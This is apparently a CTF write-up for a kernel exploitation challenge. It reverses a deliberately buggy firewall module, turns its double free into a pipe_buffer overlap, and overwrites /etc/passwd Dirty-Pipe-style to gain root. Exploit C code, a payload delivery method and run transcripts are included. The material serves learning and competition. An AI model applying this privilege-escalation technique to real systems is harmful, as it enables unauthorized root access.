---
title: "Throughthewall"
date: 2026-04-27T14:17:36+07:00
draft: false
tags: ["CTF", "PWN"]
categories: ["b01lersctf"]
contest: "b01lersctf"
author: "k1nt4r0u"
description: "Writeup for Throughthewall from b01lersctf"
difficulty: "Easy/Medium/Hard"
---
- Event: b01lers CTF 2026
- Category: `pwn`
- Challenge: `pwn/throughthewall`
- Files: `bzImage`, `initramfs.cpio.gz`, `start.sh`
- Remote: `ncat --ssl throughthewall.opus4-7.b01le.rs 8443`
- Flag: `bctf{spray_those_dirty_pipes}`

This challenge was a kernel pwn packaged as a bootable QEMU image. The archive gave a kernel, an initramfs, and a launcher script. The remote service wrapped the same VM behind TLS and a proof-of-work gate, then dropped us into a BusyBox shell as the unprivileged `ctf` user. The only real goal was to turn that shell into root and read `/flag.txt`.

The solve split into two clean parts. The kernel side was a small, fairly readable bug in `firewall.ko`. The annoying part was remote delivery: the original exploit binary worked locally, but it was far too large to upload reliably through the noisy BusyBox shell. Once that transport problem was reduced, the remote flag followed immediately.

## Challenge Setup

`start.sh` showed the VM configuration right away:

```sh
qemu-system-x86_64 \
    -m 256M \
    -nographic \
    -kernel ./bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 2 \
    -initrd ./initramfs.cpio.gz \
    -monitor /dev/null \
    -s
```

That is a good kernel-challenge baseline: KASLR, SMEP, SMAP, PTI, no GUI, serial console only. I did not need to fight the kernel mitigations directly because the module bug led to a logic-style privilege escalation instead of a ROP chain.

The initramfs was the next important artifact. After unpacking it, `init` made the execution model obvious:

1. mount `proc`, `sysfs`, and `devtmpfs`
2. `insmod /home/ctf/firewall.ko`
3. create `/flag.txt` as root-only
4. build `/etc/passwd` with `root` and `ctf`
5. `chown -R 1000:1000 /home/ctf`
6. loop forever in `/bin/drop_priv`

The passwd file was especially useful:

```text
root:x:0:0:roooooooooooooooooooooooooooooooooooooooot:/root:/bin/sh
ctf:x:1000:1000::/home/ctf:/bin/sh
```

That immediately suggested a Dirty-Pipe-style endgame if I could corrupt a `pipe_buffer`: overwrite the cached `/etc/passwd` page, turn `ctf` into uid 0, then use `su ctf -c 'cat /flag.txt'`.

## Reversing `firewall.ko`

The module was not stripped, which made the first pass unusually quick. `readelf -s` exposed the symbols I cared about:

- `fw_add_rule`
- `fw_show_rule`
- `fw_edit_rule`
- `firewall_ioctl`
- `firewall_ioctl.cold`

Strings and a light disassembly pass were enough to recover the ioctl interface:

```c
#define FW_IOC_ADD  0x41004601UL
#define FW_IOC_DEL  0x40044602UL
#define FW_IOC_EDIT 0x44184603UL
#define FW_IOC_SHOW 0x84184604UL
```

The rule objects came from a `kmalloc-1k` sized allocation:

```c
struct rule {
    uint32_t src_ip;      // +0x00
    uint32_t dst_ip;      // +0x04
    uint16_t port;        // +0x08
    uint16_t action;      // +0x0a
    char desc[0x3f4];     // +0x0c
};
```

The `EDIT` and `SHOW` ioctls used a request wrapper that carried an index, an offset, a length, and up to `0x400` bytes of data:

```c
struct fw_req {
    uint32_t idx;         // +0x00
    uint32_t pad;         // +0x04
    uint64_t off;         // +0x08
    uint64_t len;         // +0x10
    uint8_t  data[0x400]; // +0x18
};
```

The important pivot came in the delete path. `firewall_ioctl.cold` freed `rules[idx]` and printed it again afterward, but never cleared the global pointer:

```c
kfree(rules[idx]);
printk(... rules[idx] ...);
```

That one omission gave three primitives at once:

1. `SHOW` on a deleted rule became a use-after-free read.
2. `EDIT` on a deleted rule became a use-after-free write.
3. deleting the same index twice became a double free.

The double free was the real exploit primitive. Local testing with a small ioctl helper confirmed that the second `DEL` succeeded and that two later allocations could alias the same slab object.

## Turning the Double Free Into a Pipe Overlap

The trick was to aim the duplicate `kmalloc-1k` entry at a kernel object we could exploit from userland. `pipe_buffer[16]` is a very good candidate here: the pipe ring allocation also lands in `kmalloc-1k`, and once one `pipe_buffer` is backed by a page-cache page, flipping the `PIPE_BUF_FLAG_CAN_MERGE` bit recreates the classic Dirty Pipe write-into-read-only-file behavior.

The exploitation sequence was:

1. add rule 0
2. delete rule 0
3. delete rule 0 again
4. allocate one live alias rule to consume the first free-list entry
5. create a pipe so the pipe ring consumes the second free-list entry
6. splice one byte from `/etc/passwd` into the pipe
7. use `SHOW` on the aliased rule to read the overlapped `struct pipe_buffer`
8. use `EDIT` on the aliased rule to set `PIPE_BUF_FLAG_CAN_MERGE`
9. write a replacement `ctf` passwd line through the pipe
10. run `su ctf -c 'cat /flag.txt'`

The core exploit logic reduced to this:

```c
fw_add(fd, "1.1.1.1 2.2.2.2 80 1 ALLOW");
fw_del(fd, 0);
fw_del(fd, 0);
alias_idx = fw_add(fd, "3.3.3.3 4.4.4.4 81 1 ALLOW");

pipe(pipefd);
passwd_fd = open("/etc/passwd", O_RDONLY);
target_off = find_ctf_line(passwd_fd);
splice_off = target_off - 1;
splice(passwd_fd, &splice_off, pipefd[1], NULL, 1, 0);

fw_show(fd, alias_idx, 0, sizeof(pb), &pb);
pb.flags |= 0x10; /* PIPE_BUF_FLAG_CAN_MERGE */
fw_edit(fd, alias_idx, 24, &pb.flags, sizeof(pb.flags));

write(pipefd[1], "ctf::0:0:AAAAAAAAAAA:/root:/bin/sh", 35);
execve("/bin/su", argv, envp);
```

The replacement line was chosen so its length matched the original `ctf` line. That matters because Dirty Pipe is overwriting bytes in place, not growing the file:

```text
original:    ctf:x:1000:1000::/home/ctf:/bin/sh
replacement: ctf::0:0:AAAAAAAAAAA:/root:/bin/sh
```

Once this worked locally, the guest printed the placeholder flag from the unpacked initramfs:

```text
[*] trigger double-free
[+] passwd overwritten, reading flag
bctf{fake_flag}
```

At that point the kernel side was done.

## Remote Delivery Was the Real Problem

The first exploit binary was a normal statically linked glibc executable. It worked locally, but it was much too large for a reliable shell upload over the remote BusyBox session:

- raw ELF: `743552` bytes
- gzipped: `328987` bytes
- base64: `438652` bytes

The remote shell had two quirks that made this painful:

1. the first post-boot command often lost leading characters
2. the prompt emitted `\x1b[6n` cursor-position queries and generally behaved like a noisy serial console

Streaming hundreds of `printf >> file` lines into that environment was fragile. The exploit logic was already correct, so the shortest path was not to redesign the kernel attack. The shortest path was to make the payload tiny.

## Rewriting the Payload as a Tiny Static ELF

I rewrote the exploit as `exploit_tiny.c`, a syscall-only x86-64 binary with no libc at all. It uses a tiny `_start`, a handful of raw syscall wrappers, and small local helpers for `memcpy`, `memset`, and string scanning. That dropped the artifact size dramatically:

- raw ELF: `12808` bytes
- gzipped: `1532` bytes
- base64 upload: `2052` bytes

That change removed the transport pressure immediately. Instead of appending hundreds of chunks, the remote uploader could send a short heredoc, verify the file, and run it.

The final `solve_remote.py` transport logic did four things that mattered:

1. keep one sacrificial first command: `DUMMYMARKER`
2. upload the gzip-wrapped payload with a heredoc
3. synchronize every stage with explicit markers like `__UPLOAD__`, `__DEC__`, `__GZ__`, and `__READY__`
4. verify both the gzip and the final ELF before execution

The verification stage looked like this on the remote host:

```text
2052 /tmp/exploit.gz.b64
__DEC__:0
1532 /tmp/exploit.gz
f87441e30a316f60462209dcd54a3a57598c4042a9510cc87a299109a0cfb30d  /tmp/exploit.gz
__GZ__:0
12808 /tmp/exploit
7f 45 4c 46
__READY__:0
```

Those checks were important because they removed all ambiguity. If the exploit failed after that point, it would have been a kernel issue. In practice, once the transport was trustworthy, the exploit landed immediately.

## Final Remote Run

This was the successful remote transcript, trimmed to the lines that actually mattered:

```text
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAFfkA==.vjG7q57lHYKCpyQ978gr/g==
solution: <solved locally>

BusyBox v1.35.0 (Debian 1:1.35.0-4+b7) built-in shell (ash)
sh: can't access tty; job control turned off
~ $ DUMMYMARKER
sh: DUMMYMARKER: not found
~ $ stty -echo; echo __STTY__:$?
__STTY__:0
...
~ $ [*] trigger double-free
[+] passwd overwritten, reading flag
bctf{spray_those_dirty_pipes}
```

The flag was:

```text
bctf{spray_those_dirty_pipes}
```

## Takeaway

The kernel bug itself was small and honest: free a pointer, forget to null it, and a user-facing ioctl table turns that into UAF read, UAF write, and double free. The nicest part of the challenge was the exploitation path after that. Instead of forcing a full kernel ROP chain under SMEP and SMAP, it rewarded noticing that `kmalloc-1k` plus `pipe_buffer` plus `/etc/passwd` gave a much shorter route.

The part that took real cleanup was the remote wrapper. Once the exploit binary was reduced from a large glibc static to a syscall-only 12 KB payload, the remote side stopped being a guessing game and became a normal integrity-checked upload followed by a clean root escalation.
